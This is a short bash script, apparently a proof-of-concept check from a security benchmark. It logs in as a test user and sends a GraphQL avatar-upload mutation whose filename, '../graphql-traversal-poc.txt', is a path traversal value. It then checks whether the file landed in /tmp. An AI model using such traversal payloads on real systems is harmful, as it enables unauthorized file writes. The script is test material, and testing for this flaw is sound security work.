#!/usr/bin/env bash
source "$(dirname "$0")/_lib.sh"
tok=$(login_token user1@bench.local User123!)
gql 'mutation { uploadAvatar(filename:"../graphql-traversal-poc.txt", content:"owned") }' "$tok" | grep -q '"uploadAvatar":"/tmp/graphql-traversal-poc.txt"'
